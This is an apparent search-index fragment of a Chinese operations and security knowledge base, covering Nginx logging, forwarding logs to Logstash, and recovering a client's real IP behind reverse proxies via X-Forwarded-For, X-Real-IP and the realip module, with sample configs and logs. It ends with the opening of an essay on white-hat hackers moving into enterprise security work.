' ' response_body : $response_body }';","title":"\u5b8c\u6574\u7684Nginx\u65e5\u5fd7\u914d\u7f6e"},{"location":"log_analysis/nginx_log/#_2","text":"request_body\u4e0eresponse_body\u5982\u679c\u5728\u4e0a\u4f20\u6587\u4ef6\u6216\u8005\u4e0b\u8f7d\u6587\u4ef6\u65f6\uff0cbody\u5185\u5bb9\u4f1a\u5f88\u5927\uff0c\u9700\u8981\u8003\u8651\u5bf9\u6027\u80fd\u548c\u5b58\u50a8\u7684\u5f71\u54cd\u3002 \u5bf9\u4e8etimestamp\u53c2\u6570\uff0c\u53ef\u4ee5\u4e0d\u4f7f\u7528time_local\u800c\u4f7f\u7528time_iso8601\u3002 \u5982\u679c\u8fd0\u7ef4\u5bf9\u4e8e\u7f51\u7edc\u7684\u6027\u80fd\u6709\u8981\u6c42\uff0c\u53ef\u4ee5\u8003\u8651\u4f7f\u7528$tcpinfo_rtt, $tcpinfo_rttvar, $tcpinfo_snd_cwnd, $tcpinfo_rcv_space\u3002","title":"\u6ce8\u610f\u4e8b\u9879"},{"location":"log_analysis/nginx_log/#nginxlogstash","text":"log_format logstash '$remote_addr - $remote_user [$time_local] $request ' '$status $body_bytes_sent $http_referer ' ' $http_user_agent $http_x_forwarded_for '; access_log syslog:server=127.0.0.1:514,nohostname,tag=nginx_access_log logstash; Logstash\u914d\u7f6e input { udp { host = 127.0.0.1 port = 514 } } output { stdout {} }","title":"Nginx\u65e5\u5fd7\u76f4\u63a5\u8f93\u51fa\u5230Logstash"},{"location":"log_analysis/nginx_realip/","text":"Nginx\u5982\u679c\u900f\u8fc7\u4ee3\u7406\u83b7\u53d6\u771f\u5b9eIP\u5730\u5740 # \u73af\u5883 client_ip\uff1a10.10.10.1 proxy_server_1\uff1a10.10.10.16 proxy_server_2\uff1a10.10.10.17 web_server\uff1a10.10.10.18 \u4f7f\u7528X-Forwarded-For+realip\u6a21\u5757 \u4f7f\u7528realip\u6a21\u5757\u53ef\u4ee5\u89e3\u51b3\u8be5\u95ee\u9898\u3002 \u67e5\u770bnginx\u7684\u7f16\u8bd1\u53c2\u6570\uff1anginx -V\uff08\u9ed8\u8ba4\u662f\u5b89\u88c5\u4e86realip\u6a21\u5757\u7684\uff09 set_real_ip_from\uff1a\u8868\u793a\u4ece\u4f55\u5904\u83b7\u53d6\u771f\u5b9eIP\uff0c\u53ea\u8ba4\u53ef\u81ea\u5df1\u4fe1\u8d56\u7684IP\uff0c\u53ef\u4ee5\u662f\u7f51\u6bb5\uff0c\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u591a\u4e2a\u3002 real_ip_header\uff1a\u8868\u793a\u4ece\u54ea\u4e2aheader\u5c5e\u6027\u4e2d\u83b7\u53d6\u771f\u5b9eIP\u3002 real_ip_recursive\uff1a\u9012\u5f52\u68c0\u7d22\u771f\u5b9eIP\uff0c\u5982\u679c\u4eceX-Forwarded-For\u4e2d\u83b7\u53d6\uff0c\u5219\u9700\u8981\u9012\u5f52\u68c0\u7d22\uff1b\u5982\u679c\u4e2dX-Real-IP\u4e2d\u83b7\u53d6\uff0c\u65e0\u9700\u9012\u5f52\u3002 Nginx\u914d\u7f6e # proxy_server_1\u7684nginx\u914d\u7f6e location / { proxy_pass http://10.10.10.17; proxy_set_header Host $http_host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } # proxy_server_2\u7684nginx\u914d\u7f6e location / { proxy_pass http://10.10.10.18; proxy_set_header Host $http_host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } # web_server\u7684nginx\u914d\u7f6e\uff0c\u5728server\u4e2d\u65b0\u589e set_real_ip_from 10.10.10.16; set_real_ip_from 10.10.10.17; real_ip_header X-Forwarded-For; real_ip_recursive on; \u4f7f\u7528\u6d4f\u89c8\u5668\u6b63\u5e38\u8bbf\u95ee\uff0c\u9ed8\u8ba4\u4e0d\u6539\u53d8\u65e5\u5fd7\u683c\u5f0f\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u6765\u770b3\u53f0server\u7684\u65e5\u5fd7\u60c5\u51b5\u3002 # proxy_server_1\u7684\u65e5\u5fd7 10.10.10.1 - - [25/Jun/2019:20:49:03 -0400] GET / HTTP/1.1 304 0 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 - # proxy_server_2\u7684\u65e5\u5fd7 10.10.10.16 - - [25/Jun/2019:20:49:03 -0400] GET / HTTP/1.0 304 0 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 10.10.10.1 # web_server\u7684\u65e5\u5fd7 10.10.10.1 - - [25/Jun/2019:20:49:03 -0400] GET / HTTP/1.0 304 0 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 10.10.10.1, 10.10.10.16 \u8fd9\u4e2a\u65f6\u5019\u7684remote_addr\u5c31\u662f\u7528\u6237\u7684\u771f\u5b9eIP\uff0c\u6dfb\u52a0XFF\u5934\u8bbf\u95ee\uff0c\u6211\u4eec\u6765\u770b3\u53f0server\u7684\u65e5\u5fd7\u60c5\u51b5\u3002 # proxy_server_1\u7684\u65e5\u5fd7 10.10.10.1 - - [25/Jun/2019:20:59:10 -0400] GET / HTTP/1.1 200 15 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 192.168.1.1 # proxy_server_2\u7684\u65e5\u5fd7 10.10.10.16 - - [25/Jun/2019:20:59:10 -0400] GET / HTTP/1.0 200 15 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 192.168.1.1, 10.10.10.1 # web_server\u7684\u65e5\u5fd7 10.10.10.1 - - [25/Jun/2019:20:59:10 -0400] GET / HTTP/1.0 200 15 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 192.168.1.1, 10.10.10.1, 10.10.10.16 \u53ef\u4ee5\u770b\u5230\u7528\u6237\u81ea\u5df1\u914d\u7f6e\u7684XFF\u5934\u5e76\u6ca1\u6709\u88ab\u8bc6\u522b\u4e3a\u771f\u5b9e\u7684IP\u3002 \u4f7f\u7528X-Forwarded-For+\u5b89\u5168\u8bbe\u7f6e \u5728\u7b2c\u4e00\u4e2a\u4ee3\u7406\u5904\u5904\u7406\u7528\u6237\u4f20\u9012\u7684XFF\uff0c\u8fbe\u5230\u5ffd\u7565\u7528\u6237\u4f20\u9012\u7684XFF\u503c\u7684\u6548\u679c\u3002 \u914d\u7f6enginx # proxy_server_1\u7684nginx\u914d\u7f6e location / { proxy_pass http://10.10.10.17; proxy_set_header X-Forwarded-For $remote_addr; } # proxy_server_2\u7684nginx\u914d\u7f6e location / { proxy_pass http://10.10.10.18; } # web_server\u4e0d\u505a\u4efb\u4f55\u914d\u7f6e \u4f7f\u7528\u6d4f\u89c8\u5668\u6b63\u5e38\u8bbf\u95ee\uff0c\u9ed8\u8ba4\u4e0d\u6539\u53d8\u65e5\u5fd7\u683c\u5f0f\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u6765\u770b3\u53f0server\u7684\u65e5\u5fd7\u60c5\u51b5 # proxy_server_1\u7684\u65e5\u5fd7 10.10.10.1 - - [25/Jun/2019:21:17:42 -0400] GET / HTTP/1.1 304 0 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 - # proxy_server_2\u7684\u65e5\u5fd7 10.10.10.16 - - [25/Jun/2019:21:17:42 -0400] GET / HTTP/1.0 304 0 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 10.10.10.1 # web_server\u7684\u65e5\u5fd7 10.10.10.17 - - [25/Jun/2019:21:17:42 -0400] GET / HTTP/1.0 304 0 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 10.10.10.1 \u8fd9\u4e2a\u65f6\u5019http_x_forwarded_for\u5c31\u662f\u4ee3\u8868\u7528\u6237\u771f\u5b9eIP\uff0c\u6dfb\u52a0XFF\u5934\u8bbf\u95ee\uff0c\u6211\u4eec\u6765\u770b3\u53f0server\u7684\u65e5\u5fd7\u60c5\u51b5\u3002 # proxy_server_1\u7684\u65e5\u5fd7 10.10.10.1 - - [25/Jun/2019:21:19:51 -0400] GET / HTTP/1.1 200 15 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 192.168.1.1 # proxy_server_2\u7684\u65e5\u5fd7 10.10.10.16 - - [25/Jun/2019:21:19:51 -0400] GET / HTTP/1.0 200 15 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 10.10.10.1 # web_server\u7684\u65e5\u5fd7 10.10.10.17 - - [25/Jun/2019:21:19:51 -0400] GET / HTTP/1.0 200 15 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 10.10.10.1 \u4f7f\u7528X-Real-IP \u914d\u7f6eNginx # proxy_server_1\u7684nginx\u914d\u7f6e location / { proxy_pass http://10.10.10.17; proxy_set_header X-Real-IP $remote_addr; } # proxy_server_2\u7684nginx\u914d\u7f6e location / { proxy_pass http://10.10.10.18; } # \u4e24\u53f0proxy_server\u4e0eweb_server\u7684\u65e5\u5fd7\u7b2c\u4e00\u4e2a\u5b57\u6bb5\u7531$http_x_real_ip \u66ff\u6362 $remote_addr log_format main '$http_x_real_ip - $remote_user \u4f7f\u7528\u6d4f\u89c8\u5668\u6b63\u5e38\u8bbf\u95ee\uff0c\u6211\u4eec\u6765\u770b3\u53f0server\u7684\u65e5\u5fd7\u60c5\u51b5 # proxy_server_1\u7684\u65e5\u5fd7 - - - [25/Jun/2019:21:33:47 -0400] GET / HTTP/1.1 304 0 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 - # proxy_server_2\u7684\u65e5\u5fd7 10.10.10.1 - - [25/Jun/2019:21:41:59 -0400] GET / HTTP/1.0 304 0 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 - # web_server\u7684\u65e5\u5fd7 10.10.10.1 - - [25/Jun/2019:21:33:47 -0400] GET / HTTP/1.0 304 0 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 - \u8fd9\u4e2a\u65f6\u5019web_server\u7684http_x_real_ip\u5c31\u662f\u4ee3\u8868\u7528\u6237\u771f\u5b9eIP\uff0c\u6dfb\u52a0XFF\u5934\u8bbf\u95ee\uff0c\u6211\u4eec\u6765\u770b3\u53f0server\u7684\u65e5\u5fd7\u60c5\u51b5\u3002 # proxy_server_1\u7684\u65e5\u5fd7 - - - [25/Jun/2019:21:34:24 -0400] GET / HTTP/1.1 200 15 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 192.168.1.1 # proxy_server_2\u7684\u65e5\u5fd7 10.10.10.1 - - [25/Jun/2019:21:42:26 -0400] GET / HTTP/1.0 200 15 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 192.168.1.1 # web_server\u7684\u65e5\u5fd7 10.10.10.1 - - [25/Jun/2019:21:34:24 -0400] GET / HTTP/1.0 200 15 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 192.168.1.1 \u4e0e\u672a\u914d\u7f6eXFF\u4e00\u81f4\u3002 \u53c2\u8003\u8d44\u6599 Nginx\u591a\u7ea7\u53cd\u5411\u4ee3\u7406\u4e0b\u7684IP\u900f\u4f20 Nginx \u4e4b X-Forwarded-For \u4e2d\u9996\u4e2aIP\u4e00\u5b9a\u771f\u5b9e\u5417\uff1f","title":"Nginx\u5982\u679c\u900f\u8fc7\u4ee3\u7406\u83b7\u53d6\u771f\u5b9eIP\u5730\u5740"},{"location":"log_analysis/nginx_realip/#nginxip","text":"# \u73af\u5883 client_ip\uff1a10.10.10.1 proxy_server_1\uff1a10.10.10.16 proxy_server_2\uff1a10.10.10.17 web_server\uff1a10.10.10.18","title":"Nginx\u5982\u679c\u900f\u8fc7\u4ee3\u7406\u83b7\u53d6\u771f\u5b9eIP\u5730\u5740"},{"location":"log_analysis/nginx_realip/#x-forwarded-forrealip","text":"\u4f7f\u7528realip\u6a21\u5757\u53ef\u4ee5\u89e3\u51b3\u8be5\u95ee\u9898\u3002 \u67e5\u770bnginx\u7684\u7f16\u8bd1\u53c2\u6570\uff1anginx -V\uff08\u9ed8\u8ba4\u662f\u5b89\u88c5\u4e86realip\u6a21\u5757\u7684\uff09 set_real_ip_from\uff1a\u8868\u793a\u4ece\u4f55\u5904\u83b7\u53d6\u771f\u5b9eIP\uff0c\u53ea\u8ba4\u53ef\u81ea\u5df1\u4fe1\u8d56\u7684IP\uff0c\u53ef\u4ee5\u662f\u7f51\u6bb5\uff0c\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u591a\u4e2a\u3002 real_ip_header\uff1a\u8868\u793a\u4ece\u54ea\u4e2aheader\u5c5e\u6027\u4e2d\u83b7\u53d6\u771f\u5b9eIP\u3002 real_ip_recursive\uff1a\u9012\u5f52\u68c0\u7d22\u771f\u5b9eIP\uff0c\u5982\u679c\u4eceX-Forwarded-For\u4e2d\u83b7\u53d6\uff0c\u5219\u9700\u8981\u9012\u5f52\u68c0\u7d22\uff1b\u5982\u679c\u4e2dX-Real-IP\u4e2d\u83b7\u53d6\uff0c\u65e0\u9700\u9012\u5f52\u3002","title":"\u4f7f\u7528X-Forwarded-For+realip\u6a21\u5757"},{"location":"log_analysis/nginx_realip/#nginx","text":"# proxy_server_1\u7684nginx\u914d\u7f6e location / { proxy_pass http://10.10.10.17; proxy_set_header Host $http_host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } # proxy_server_2\u7684nginx\u914d\u7f6e location / { proxy_pass http://10.10.10.18; proxy_set_header Host $http_host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } # web_server\u7684nginx\u914d\u7f6e\uff0c\u5728server\u4e2d\u65b0\u589e set_real_ip_from 10.10.10.16; set_real_ip_from 10.10.10.17; real_ip_header X-Forwarded-For; real_ip_recursive on; \u4f7f\u7528\u6d4f\u89c8\u5668\u6b63\u5e38\u8bbf\u95ee\uff0c\u9ed8\u8ba4\u4e0d\u6539\u53d8\u65e5\u5fd7\u683c\u5f0f\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u6765\u770b3\u53f0server\u7684\u65e5\u5fd7\u60c5\u51b5\u3002 # proxy_server_1\u7684\u65e5\u5fd7 10.10.10.1 - - [25/Jun/2019:20:49:03 -0400] GET / HTTP/1.1 304 0 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 - # proxy_server_2\u7684\u65e5\u5fd7 10.10.10.16 - - [25/Jun/2019:20:49:03 -0400] GET / HTTP/1.0 304 0 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 10.10.10.1 # web_server\u7684\u65e5\u5fd7 10.10.10.1 - - [25/Jun/2019:20:49:03 -0400] GET / HTTP/1.0 304 0 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 10.10.10.1, 10.10.10.16 \u8fd9\u4e2a\u65f6\u5019\u7684remote_addr\u5c31\u662f\u7528\u6237\u7684\u771f\u5b9eIP\uff0c\u6dfb\u52a0XFF\u5934\u8bbf\u95ee\uff0c\u6211\u4eec\u6765\u770b3\u53f0server\u7684\u65e5\u5fd7\u60c5\u51b5\u3002 # proxy_server_1\u7684\u65e5\u5fd7 10.10.10.1 - - [25/Jun/2019:20:59:10 -0400] GET / HTTP/1.1 200 15 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 192.168.1.1 # proxy_server_2\u7684\u65e5\u5fd7 10.10.10.16 - - [25/Jun/2019:20:59:10 -0400] GET / HTTP/1.0 200 15 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 192.168.1.1, 10.10.10.1 # web_server\u7684\u65e5\u5fd7 10.10.10.1 - - [25/Jun/2019:20:59:10 -0400] GET / HTTP/1.0 200 15 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 192.168.1.1, 10.10.10.1, 10.10.10.16 \u53ef\u4ee5\u770b\u5230\u7528\u6237\u81ea\u5df1\u914d\u7f6e\u7684XFF\u5934\u5e76\u6ca1\u6709\u88ab\u8bc6\u522b\u4e3a\u771f\u5b9e\u7684IP\u3002","title":"Nginx\u914d\u7f6e"},{"location":"log_analysis/nginx_realip/#x-forwarded-for","text":"\u5728\u7b2c\u4e00\u4e2a\u4ee3\u7406\u5904\u5904\u7406\u7528\u6237\u4f20\u9012\u7684XFF\uff0c\u8fbe\u5230\u5ffd\u7565\u7528\u6237\u4f20\u9012\u7684XFF\u503c\u7684\u6548\u679c\u3002 \u914d\u7f6enginx # proxy_server_1\u7684nginx\u914d\u7f6e location / { proxy_pass http://10.10.10.17; proxy_set_header X-Forwarded-For $remote_addr; } # proxy_server_2\u7684nginx\u914d\u7f6e location / { proxy_pass http://10.10.10.18; } # web_server\u4e0d\u505a\u4efb\u4f55\u914d\u7f6e \u4f7f\u7528\u6d4f\u89c8\u5668\u6b63\u5e38\u8bbf\u95ee\uff0c\u9ed8\u8ba4\u4e0d\u6539\u53d8\u65e5\u5fd7\u683c\u5f0f\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u6765\u770b3\u53f0server\u7684\u65e5\u5fd7\u60c5\u51b5 # proxy_server_1\u7684\u65e5\u5fd7 10.10.10.1 - - [25/Jun/2019:21:17:42 -0400] GET / HTTP/1.1 304 0 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 - # proxy_server_2\u7684\u65e5\u5fd7 10.10.10.16 - - [25/Jun/2019:21:17:42 -0400] GET / HTTP/1.0 304 0 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 10.10.10.1 # web_server\u7684\u65e5\u5fd7 10.10.10.17 - - [25/Jun/2019:21:17:42 -0400] GET / HTTP/1.0 304 0 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 10.10.10.1 \u8fd9\u4e2a\u65f6\u5019http_x_forwarded_for\u5c31\u662f\u4ee3\u8868\u7528\u6237\u771f\u5b9eIP\uff0c\u6dfb\u52a0XFF\u5934\u8bbf\u95ee\uff0c\u6211\u4eec\u6765\u770b3\u53f0server\u7684\u65e5\u5fd7\u60c5\u51b5\u3002 # proxy_server_1\u7684\u65e5\u5fd7 10.10.10.1 - - [25/Jun/2019:21:19:51 -0400] GET / HTTP/1.1 200 15 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 192.168.1.1 # proxy_server_2\u7684\u65e5\u5fd7 10.10.10.16 - - [25/Jun/2019:21:19:51 -0400] GET / HTTP/1.0 200 15 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 10.10.10.1 # web_server\u7684\u65e5\u5fd7 10.10.10.17 - - [25/Jun/2019:21:19:51 -0400] GET / HTTP/1.0 200 15 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 10.10.10.1","title":"\u4f7f\u7528X-Forwarded-For+\u5b89\u5168\u8bbe\u7f6e"},{"location":"log_analysis/nginx_realip/#x-real-ip","text":"\u914d\u7f6eNginx # proxy_server_1\u7684nginx\u914d\u7f6e location / { proxy_pass http://10.10.10.17; proxy_set_header X-Real-IP $remote_addr; } # proxy_server_2\u7684nginx\u914d\u7f6e location / { proxy_pass http://10.10.10.18; } # \u4e24\u53f0proxy_server\u4e0eweb_server\u7684\u65e5\u5fd7\u7b2c\u4e00\u4e2a\u5b57\u6bb5\u7531$http_x_real_ip \u66ff\u6362 $remote_addr log_format main '$http_x_real_ip - $remote_user \u4f7f\u7528\u6d4f\u89c8\u5668\u6b63\u5e38\u8bbf\u95ee\uff0c\u6211\u4eec\u6765\u770b3\u53f0server\u7684\u65e5\u5fd7\u60c5\u51b5 # proxy_server_1\u7684\u65e5\u5fd7 - - - [25/Jun/2019:21:33:47 -0400] GET / HTTP/1.1 304 0 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 - # proxy_server_2\u7684\u65e5\u5fd7 10.10.10.1 - - [25/Jun/2019:21:41:59 -0400] GET / HTTP/1.0 304 0 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 - # web_server\u7684\u65e5\u5fd7 10.10.10.1 - - [25/Jun/2019:21:33:47 -0400] GET / HTTP/1.0 304 0 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 - \u8fd9\u4e2a\u65f6\u5019web_server\u7684http_x_real_ip\u5c31\u662f\u4ee3\u8868\u7528\u6237\u771f\u5b9eIP\uff0c\u6dfb\u52a0XFF\u5934\u8bbf\u95ee\uff0c\u6211\u4eec\u6765\u770b3\u53f0server\u7684\u65e5\u5fd7\u60c5\u51b5\u3002 # proxy_server_1\u7684\u65e5\u5fd7 - - - [25/Jun/2019:21:34:24 -0400] GET / HTTP/1.1 200 15 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 192.168.1.1 # proxy_server_2\u7684\u65e5\u5fd7 10.10.10.1 - - [25/Jun/2019:21:42:26 -0400] GET / HTTP/1.0 200 15 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 192.168.1.1 # web_server\u7684\u65e5\u5fd7 10.10.10.1 - - [25/Jun/2019:21:34:24 -0400] GET / HTTP/1.0 200 15 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 192.168.1.1 \u4e0e\u672a\u914d\u7f6eXFF\u4e00\u81f4\u3002","title":"\u4f7f\u7528X-Real-IP"},{"location":"log_analysis/nginx_realip/#_1","text":"Nginx\u591a\u7ea7\u53cd\u5411\u4ee3\u7406\u4e0b\u7684IP\u900f\u4f20 Nginx \u4e4b X-Forwarded-For \u4e2d\u9996\u4e2aIP\u4e00\u5b9a\u771f\u5b9e\u5417\uff1f","title":"\u53c2\u8003\u8d44\u6599"},{"location":"miscellaneous/jsrc-1/","text":"\u767d\u5e3d\u5b50\u8f6c\u578b\u7532\u65b9\u6742\u7eea 1.\u4f01\u4e1a\u5b89\u5168\u5efa\u8bbe\u6db5\u76d6\u7684\u5185\u5bb9 \u5b89\u5168\u662f\u4e00\u95e8\u542b\u4e49\u5f88\u5e7f\u7684\u5b66\u79d1\uff0c\u4fe1\u606f\u5b89\u5168\u3001\u7f51\u7edc\u5b89\u5168\u3001\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u7b49\u90fd\u662f\u5b89\u5168\u4e2d\u7684\u4e00\u4e2a\u5206\u652f\uff0c\u6709\u4ea4\u96c6\u5374\u4e5f\u6709\u4e0d\u540c\u3002 \u5bf9\u4e8e\u7532\u65b9\u4f01\u4e1a\u5b89\u5168\u6765\u8bf4\uff0c\u901a\u5e38\u53c8\u5206\u4e3a\uff1a\u5b89\u5168\u4f53\u7cfb\uff08\u7b49\u4fdd\u3001\u5408\u89c4\u3001\u5ba1\u8ba1\uff09\u3001\u57fa\u7840\u8bbe\u65bd\u5b89\u5168\uff08\u4e3b\u673a\u3001\u7f51\u7edc\u3001\u7ec8\u7aef\uff09\u3001\u5e94\u7528\u5b89\u5168\uff08Web\u3001\u79fb\u52a8\uff09\u3001\u4e1a\u52a1\u5b89\u5168\uff08\u8d26\u6237\u3001\u4ea4\u6613\u3001\u5185\u5bb9\u3001\u6d3b\u52a8\uff09\u3001\u5b89\u5168\u8fd0\u8425\uff08\u5e94\u6025\u54cd\u5e94\u3001\u5b89\u5168\u57f9\u8bad\uff09\u3001\u6570\u636e\u5b89\u5168\uff08\u52a0\u5bc6\u3001\u8131\u654f\u3001\u5b58\u50a8\uff09\u7b49\u7b49\uff0c\u4e0d\u540c\u4f01\u4e1a\u5728\u4e0d\u540c\u7684\u53d1\u5c55\u9636\u6bb5\u6240\u4fa7\u91cd\u7684\u5b89\u5168\u70b9\u4e5f\u4e0d\u4e00\u81f4\u3002 \u5728\u4e0a\u8ff0\u7684\u6bcf\u4e00\u4e2a\u7c7b\u578b\u4e2d\u6709\u5f88\u591a\u5b50\u7c7b\uff0c\u6bcf\u4e2a\u5b50\u7c7b\u90fd\u6709\u4e00\u4e2a\u5faa\u5e8f\u6e10\u8fdb\u7684\u8def\u7ebf\uff0c\u6bd4\u5982\uff1a\u5b89\u5168\u6d4b\u8bd5\u5de5\u4f5c \u5b89\u5168\u6d4b\u8bd5\u4e00\u822c\u5206\u4e3a\u5b9a\u671f\u7684\u5b89\u5168\u5de1\u68c0\u3001\u65b0\u4e1a\u52a1/\u65b0\u529f\u80fd\u4e0a\u7ebf\u524d\u7684\u5b89\u5168\u6d4b\u8bd5\uff0c\u5b89\u5168\u6d4b\u8bd5\u5728\u5e94\u7528\u5b89\u5168\u4e2d\u7b97\u662f\u4e00\u4e2a\u6bd4\u8f83\u5c0f\u7684\u70b9\u3002\u4f46\u662f\u6211\u4eec\u901a\u8fc7\u4e00\u5b9a\u65f6\u95f4\u7684\u5b89\u5168\u6d4b\u8bd5\uff0c\u6574\u7406\u6211\u4eec\u901a\u8fc7\u5b89\u5168\u6d4b\u8bd5\u6240\u53d1\u73b0\u7684\u6f0f\u6d1e\u5f97\u51fa\u51fa\u73b0\u6f0f\u6d1e\u7684\u539f\u56e0\uff0c\u5f62\u6210\u8bbe\u8ba1\u89c4\u8303\uff0c\u7f16\u7801\u89c4\u8303\u8fdb\u884c\u63a8\u5e7f\u5230\u7814\u53d1\u56e2\u961f\u3001\u4ea7\u54c1\u56e2\u961f\uff0c\u5e76\u9010\u6b65\u53c2\u4e0e\u5230\u4ea7\u54c1\u7684\u6574\u4e2a\u6d41\u7a0b\u4e2d\uff0c\u8fd9\u6837\u5c31\u65e0\u5f62\u4e2d\u63a8\u52a8\u4e86\"S-SDL\"\u3002 \u5b89\u5168\u662f\u4e00\u6761\u6f2b\u957f\u7684\u8def\uff0c\u4e00\u6b65\u4e00\u4e2a\u811a\u5370\u5f88\u91cd\u8981\uff01 2.\u4ece\u767d\u5e3d\u5b50\u8f6c\u578b\u7684\u601d\u8def \u76ee\u524d\u5f88\u591a\u4f01\u4e1a\u4e2d\u7684\u5b89\u5168\u5de5\u7a0b\u5e08\u5927\u90e8\u5206\u90fd\u662f\u7531\u767d\u5e3d\u5b50\u8f6c\u578b\u8fc7\u6765\u7684\uff0c\u4f46\u662f\u7531\u4e8e\u6f0f\u6d1e\u6316\u6398\u4e0e\u7532\u65b9\u5b89\u5168\u5efa\u8bbe\u8fd8\u662f\u5b58\u5728\u5f88\u5927\u7684\u5dee\u5f02\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u8f6c\u578b\u7684\u65f6\u5019\u9700\u8981\u505a\u597d\u51e0\u4ef6\u4e8b\uff1a \u505a\u81ea\u5df1\u64c5\u957f\u7684\u4e8b\u60c5 